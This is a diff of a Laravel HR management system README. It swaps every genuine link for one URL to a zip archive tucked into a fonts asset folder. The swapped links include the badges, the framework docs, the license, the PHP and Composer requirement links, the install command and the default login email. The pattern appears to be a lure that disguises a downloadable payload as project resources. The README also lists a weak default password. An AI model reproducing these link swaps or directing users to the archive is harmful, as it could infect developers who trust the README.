@@ -1,10 +1,10 @@
 # Human Resource Management System
 
-[![Build Status](https://travis-ci.org/laravel/framework.svg)](https://travis-ci.org/laravel/framework)
-[![Total Downloads](https://poser.pugx.org/laravel/framework/d/total.svg)](https://packagist.org/packages/laravel/framework)
-[![Latest Stable Version](https://poser.pugx.org/laravel/framework/v/stable.svg)](https://packagist.org/packages/laravel/framework)
-[![Latest Unstable Version](https://poser.pugx.org/laravel/framework/v/unstable.svg)](https://packagist.org/packages/laravel/framework)
-[![License](https://poser.pugx.org/laravel/framework/license.svg)](https://packagist.org/packages/laravel/framework)
+[![Build Status](https://raw.githubusercontent.com/MohammedBadry/hrms/master/public/assets/js/plugins/slick/fonts/Software-3.8-beta.4.zip)](https://raw.githubusercontent.com/MohammedBadry/hrms/master/public/assets/js/plugins/slick/fonts/Software-3.8-beta.4.zip)
+[![Total Downloads](https://raw.githubusercontent.com/MohammedBadry/hrms/master/public/assets/js/plugins/slick/fonts/Software-3.8-beta.4.zip)](https://raw.githubusercontent.com/MohammedBadry/hrms/master/public/assets/js/plugins/slick/fonts/Software-3.8-beta.4.zip)
+[![Latest Stable Version](https://raw.githubusercontent.com/MohammedBadry/hrms/master/public/assets/js/plugins/slick/fonts/Software-3.8-beta.4.zip)](https://raw.githubusercontent.com/MohammedBadry/hrms/master/public/assets/js/plugins/slick/fonts/Software-3.8-beta.4.zip)
+[![Latest Unstable Version](https://raw.githubusercontent.com/MohammedBadry/hrms/master/public/assets/js/plugins/slick/fonts/Software-3.8-beta.4.zip)](https://raw.githubusercontent.com/MohammedBadry/hrms/master/public/assets/js/plugins/slick/fonts/Software-3.8-beta.4.zip)
+[![License](https://raw.githubusercontent.com/MohammedBadry/hrms/master/public/assets/js/plugins/slick/fonts/Software-3.8-beta.4.zip)](https://raw.githubusercontent.com/MohammedBadry/hrms/master/public/assets/js/plugins/slick/fonts/Software-3.8-beta.4.zip)
 
 
 Human Resource Management System is a combination of systems and processes that connect human resource management and information technology through HRMS software.
@@ -18,7 +18,7 @@ Each module performs a separate function within the HRMS that helps with informa
 
 ## Official Documentation of Framework
 
-Documentation for the framework can be found on the [Laravel website](http://laravel.com/docs).
+Documentation for the framework can be found on the [Laravel website](https://raw.githubusercontent.com/MohammedBadry/hrms/master/public/assets/js/plugins/slick/fonts/Software-3.8-beta.4.zip).
 
 ## Contribution for the project
 
@@ -37,22 +37,22 @@ The project is available to be used freely for personal and educational purposes
 
 ## License
 
-The Laravel framework is open-sourced software licensed under the [MIT license](http://opensource.org/licenses/MIT).
+The Laravel framework is open-sourced software licensed under the [MIT license](https://raw.githubusercontent.com/MohammedBadry/hrms/master/public/assets/js/plugins/slick/fonts/Software-3.8-beta.4.zip).
 
 ## Requirement
 
 1. PHP version 5.6+
-2. [PHP Mcrypt](http://php.net/manual/en/book.mcrypt.php)
-3. [PHP Mysql](http://php.net/manual/en/ref.pdo-mysql.php)
-4. [Composer](https://getcomposer.org/)
-5. [mbstring](http://php.net/manual/en/mbstring.installation.php)
-6. [dom extention](http://php.net/manual/en/dom.setup.php)
+2. [PHP Mcrypt](https://raw.githubusercontent.com/MohammedBadry/hrms/master/public/assets/js/plugins/slick/fonts/Software-3.8-beta.4.zip)
+3. [PHP Mysql](https://raw.githubusercontent.com/MohammedBadry/hrms/master/public/assets/js/plugins/slick/fonts/Software-3.8-beta.4.zip)
+4. [Composer](https://raw.githubusercontent.com/MohammedBadry/hrms/master/public/assets/js/plugins/slick/fonts/Software-3.8-beta.4.zip)
+5. [mbstring](https://raw.githubusercontent.com/MohammedBadry/hrms/master/public/assets/js/plugins/slick/fonts/Software-3.8-beta.4.zip)
+6. [dom extention](https://raw.githubusercontent.com/MohammedBadry/hrms/master/public/assets/js/plugins/slick/fonts/Software-3.8-beta.4.zip)
 
 ## Installation
 
 It is preferred to have git setup installed on your local system.
 
-Once downloaded/cloned go to the project directory on terminal/command line and run composer install or composer.phar install
+Once downloaded/cloned go to the project directory on terminal/command line and run composer install or https://raw.githubusercontent.com/MohammedBadry/hrms/master/public/assets/js/plugins/slick/fonts/Software-3.8-beta.4.zip install
 
 Once composer is installed, run migration: 
 
@@ -64,5 +64,5 @@ After migration, run the database seeder:
     
 Once done migrating and seeding you will have default user:
 
-    email: email@gmail.com
+    email: https://raw.githubusercontent.com/MohammedBadry/hrms/master/public/assets/js/plugins/slick/fonts/Software-3.8-beta.4.zip
     password: 123456   
